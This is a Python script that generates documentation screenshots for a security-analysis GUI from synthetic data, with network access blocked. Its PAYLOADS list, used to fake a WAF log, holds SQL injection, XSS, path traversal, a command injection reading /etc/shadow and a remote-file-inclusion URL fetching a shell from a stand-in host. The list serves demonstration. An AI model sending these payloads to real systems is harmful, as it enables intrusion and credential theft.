"""Generate the README / docs screenshots from SYNTHETIC data only.

    python tools/generate_screenshots.py            # writes docs/screenshots/*.png
    python tools/generate_screenshots.py --scale 2  # sharper (2x device pixel ratio)

Safety properties (so the output can be published):
  * All network access is blocked and API keys are ignored - nothing real is queried.
  * All indicators are RFC 5737 documentation IPs (192.0.2.0/24, 198.51.100.0/24,
    203.0.113.0/24) and ".example" domains.
  * The history database and Qt settings live in a temporary directory.
  * The AI SOC Analyst answer shown in the chat screenshot is a canned, illustrative text
    (no Groq call is made).
Fonts: the capture uses whatever fonts the machine has. Run it on Windows to get Segoe UI.
"""
import argparse
import importlib
import json
import os
import sys
import tempfile
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

ap = argparse.ArgumentParser()
ap.add_argument("--scale", type=float, default=1.5, help="device pixel ratio (default 1.5)")
ap.add_argument("--size", default="1600x900", help="logical window size")
ap.add_argument("--out", default=os.path.join(ROOT, "docs", "screenshots"))
args = ap.parse_args()
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
os.environ["QT_SCALE_FACTOR"] = str(args.scale)

from PyQt5.QtCore import QCoreApplication, QEvent, QSettings, Qt, QThread, pyqtSignal   # noqa: E402

QSettings.setDefaultFormat(QSettings.IniFormat)
QSettings.setPath(QSettings.IniFormat, QSettings.UserScope, tempfile.mkdtemp(prefix="gai_shots_"))
QCoreApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
QCoreApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

import requests                                                                           # noqa: E402


def _blocked(*_a, **_k):
    raise requests.exceptions.ConnectionError("network disabled while generating screenshots")


requests.sessions.Session.request = _blocked

m = importlib.import_module(os.environ.get("GUARDIAN_MODULE", "guardian_ai_v4_fixed"))
m._CONFIG = m._default_config()                       # ignore any real keys
for _k in ("VIRUSTOTAL_API_KEY", "ABUSEIPDB_API_KEY", "SHODAN_API_KEY", "HYBRID_API_KEY", "GROQ_API_KEY"):
    setattr(m, _k, "")
m.DB_PATH = os.path.join(tempfile.mkdtemp(prefix="gai_shots_db_"), "demo_history.db")
m.init_db()

from PyQt5.QtWidgets import QApplication, QMessageBox                                      # noqa: E402

app = QApplication(sys.argv)
app.setStyleSheet(m.STYLESHEET)
app.setWindowIcon(m.load_app_icon())
for _n in ("warning", "critical", "question", "information"):
    setattr(QMessageBox, _n, staticmethod(lambda *a, **k: QMessageBox.Yes))


def pump(ms=300):
    end = time.time() + ms / 1000
    while time.time() < end:
        app.processEvents()
        app.sendPostedEvents(None, QEvent.DeferredDelete)
        time.sleep(0.01)


# ── synthetic data ───────────────────────────────────────────────────────────
ATTACKERS = ["198.51.100.23", "198.51.100.77", "203.0.113.45"]
TARGETS = ["192.0.2.10", "192.0.2.11", "192.0.2.20"]
DOMAINS = {"192.0.2.10": "shop.example", "192.0.2.11": "portal.example", "192.0.2.20": "api.example"}
PAYLOADS = [
    ("/login.php?id=1' OR 1=1--", "sqlmap/1.7", 403),
    ("/search?q=<script>alert(1)</script>", "Mozilla/5.0", 403),
    ("/../../etc/passwd", "nikto/2.5", 404),
    ("/admin/config.php", "curl/8.4", 403),
    ("/wp-login.php", "python-requests/2.31", 200),
    ("/api/v1/users?id=1 UNION SELECT NULL--", "sqlmap/1.7", 403),
    ("/cgi-bin/test.cgi?cmd=;cat%20/etc/shadow", "Mozilla/5.0", 403),
    ("/index.php?file=http://evil-c2.example/shell.txt", "Mozilla/5.0", 403),
]


def synthetic_waf_log(path):
    rows, minute = [], 0
    for i in range(72):
        a = ATTACKERS[i % len(ATTACKERS)]
        url, ua, code = PAYLOADS[i % len(PAYLOADS)]
        dst = TARGETS[i % len(TARGETS)]
        rows.append({"timestamp": f"2026-10-30T10:{(minute // 60) % 60:02d}:{minute % 60:02d}Z",
                     "src_ip": a, "dst_ip": dst, "domain": DOMAINS[dst], "url": url, "method": "GET",
                     "status_code": code, "action": "block" if code >= 400 else "allow", "user_agent": ua})
        minute += 7 + (i % 5)
    for i in range(10):
        rows.append({"timestamp": f"2026-10-30T11:{i:02d}:00Z", "src_ip": "192.0.2.77", "dst_ip": TARGETS[0],
                     "url": "/index.html", "method": "GET", "status_code": 200, "action": "allow",
                     "user_agent": "Mozilla/5.0"})
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(rows, fh)


tmp = tempfile.mkdtemp(prefix="gai_demo_")
waf_path = os.path.join(tmp, "demo_waf.json"); synthetic_waf_log(waf_path)
mal_path = os.path.join(ROOT, "tests", "fixtures", "sample_malware.txt")
waf = m.analyze_forensics_file(waf_path, max_records=None)
mal = m.analyze_malware("", mal_path)

CTI_RESULT = {
    "ioc": "198.51.100.23", "type": "ip", "risk_score": 82, "severity": "high",
    "sources": {
        "virustotal": {"source": "VirusTotal", "score": 62, "malicious_count": 14, "verdict": "malicious",
                       "country": "ZZ", "tags": ["scanner", "tor"]},
        "abuseipdb": {"source": "AbuseIPDB", "score": 100, "total_reports": 412, "num_distinct_users": 88,
                      "last_reported_at": "2026-10-30T09:41:00+00:00", "country_code": "ZZ",
                      "country_name": "Example Country (synthetic)", "isp": "Example Transit Ltd (synthetic)",
                      "domain": "transit.example", "usage_type": "Data Center/Web Hosting/Transit", "is_tor": True,
                      "reports": [
                          {"reported_at": "2026-10-30T09:41:00+00:00", "comment": "SSH brute force against honeypot",
                           "categories": [18, 22], "reporter_country_code": "ZZ"},
                          {"reported_at": "2026-10-30T08:12:00+00:00", "comment": "Web scanning: SQL injection probes",
                           "categories": [21, 15], "reporter_country_code": "ZZ"},
                          {"reported_at": "2026-10-29T22:03:00+00:00", "comment": "Port scan / service discovery",
                           "categories": [14], "reporter_country_code": "ZZ"}]},
        "shodan": {"source": "Shodan", "score": 0, "open_ports": [22, 443], "vulns": [],
                   "org": "Example Hosting (synthetic)", "hostnames": ["host.example"],
                   "services": [{"port": 22, "transport": "tcp", "product": "OpenSSH", "banner_snippet": "SSH-2.0-OpenSSH_9.6"},
                                {"port": 443, "transport": "tcp", "product": "nginx", "banner_snippet": "HTTP/1.1 200 OK"}]},
    },
    "summary": {"verdict": "malicious", "country": "ZZ", "isp": "Example Transit Ltd (synthetic)",
                "org": "Example Hosting (synthetic)", "hostnames": ["host.example"], "open_ports": [22, 443],
                "services": [], "vulns": [], "is_tor": True, "abuse_score": 100, "vt_malicious": 14,
                "resolved_domain": "host.example"},
}

HISTORY = [
    ("cti", "high", "198.51.100.23", "CTI: 198.51.100.23 - verdict=malicious score=82", CTI_RESULT),
    ("malware", mal["severity"], "sample_malware.txt",
     f"Malware: verdict={mal['verdict']} score={mal['threat_score']}", mal),
    ("forensics", "high", "demo_waf.json", f"Forensics: {len(waf['findings'])} findings across {waf['total_records']} records", waf),
    ("cti", "low", "example.org", "CTI: example.org - verdict=clean score=3", {"ioc": "example.org", "sources": {}}),
    ("cti", "medium", "203.0.113.45", "CTI: 203.0.113.45 - verdict=suspicious score=44", {"ioc": "203.0.113.45", "sources": {}}),
]
for mod, sev, ioc, summ, payload in HISTORY:
    m.save_to_db(mod, sev, ioc, summ, payload)
time.sleep(0.6)


class _FakeChat(QThread):
    reply_ready = pyqtSignal(str)
    error = pyqtSignal(str)

    def __init__(self, messages):
        super().__init__()

    def run(self):
        time.sleep(0.2)
        self.reply_ready.emit(
            "**Analisis:**\nSampel menjalankan PowerShell ter-encode (`-enc`) dengan jendela tersembunyi dan "
            "mencoba mengunduh payload dari alamat dokumentasi (`198.51.100.23`).\n\n**Risiko:** HIGH\n\n"
            "**Alasan:**\n- Teknik *Encoded PowerShell* terdeteksi (fakta)\n- URL/IP terekstrak dari string\n"
            "- Analisis lokal bersifat statis, tidak ada eksekusi sandbox\n\n**Rekomendasi:**\n"
            "1. Isolasi host yang menerima file\n2. Blokir indikator jaringan di proxy/DNS\n"
            "3. Konfirmasi dengan analisis sandbox")


m.ChatWorker = _FakeChat

# ── capture ──────────────────────────────────────────────────────────────────
W, H = (int(x) for x in args.size.lower().split("x"))
os.makedirs(args.out, exist_ok=True)
w = m.MainWindow()
w.resize(W, H)
w.show()
pump(900)


def shot(name):
    pump(500)
    path = os.path.join(args.out, name)
    w.grab().save(path)
    print("  wrote", os.path.relpath(path, ROOT))


# 1) dashboard
w._switch(0)
w.pg_dash.refresh_now(); w._history_panel._load(); pump(600)
shot("01-dashboard.png")

# 2-3) CTI overview + AbuseIPDB
w._switch(1)
w.pg_cti.inp.setText("198.51.100.23")
w.pg_cti._display(CTI_RESULT); pump(400)
shot("02-cti-overview.png")
w.pg_cti.tabs.setCurrentIndex(3)
shot("03-abuseipdb.png")

# 4) malware analysis + AI analyst conversation (chat panel is visible next to the page)
w._switch(2)
w.pg_malware._display(mal)
w._chat_panel.set_context("malware", {"module": "malware", "verdict": mal["verdict"],
                                      "analysis_result": {"submit_name": "sample_malware.txt"}})
shot("04-malware-analysis.png")
w._chat_panel._send("Kenapa sampel ini berbahaya?")
t0 = time.time()
while w._chat_panel._loading.isVisible() and time.time() - t0 < 8:
    pump(100)
shot("08-ai-soc-analyst.png")
w._chat_panel._clear_chat()                           # keep later captures free of the malware chat

# 5-7) forensics
w._switch(3)
pg = w.pg_forensics
pg._last_forensics_result = waf
pg._display(waf)
pg.attack_graph_tab.build_graph(waf)
shot("05-forensics-findings.png")
# timeline + graph are wide views: close the side panels for these two captures
if not w._chat_panel.isHidden():
    w._toggle_chat()
if not w._history_panel.isHidden():
    w._toggle_history()
pump(400)
pg.tabs.setCurrentIndex(3)
shot("06-attack-timeline.png")
pg.tabs.setCurrentIndex(pg._graph_idx)
pump(2500)
gv = pg.attack_graph_tab
ip_nodes = [i for i in gv._scene.items()
            if isinstance(i, m.AttackGraphNode) and i.node_data.get("type") == "ip"]
if ip_nodes:                                           # frame the IP cluster (attackers and targets)
    rect = ip_nodes[0].sceneBoundingRect()
    for n in ip_nodes[1:]:
        rect = rect.united(n.sceneBoundingRect())
    gv._scene.setSceneRect(rect.adjusted(-900, -700, 900, 700))   # room to centre the cluster
    gv._view.fitInView(rect.adjusted(-260, -260, 260, 260), Qt.KeepAspectRatio)
else:
    gv._fit_view()
shot("07-attack-graph.png")
w._toggle_chat(); w._toggle_history(); pump(400)       # restore the side panels

# 9) history with a selected entry
w._switch(0)
cards = [c for c in w._history_panel._card_widgets if getattr(c, "_entry", None)]
if cards:
    w._history_panel._on_card_click(cards[1]._entry)     # malware entry (this also reloads its page)
w._switch(0)
shot("09-analysis-history.png")

w._history_panel.shutdown_workers()
w._chat_panel.shutdown()
w.close()
print("done")
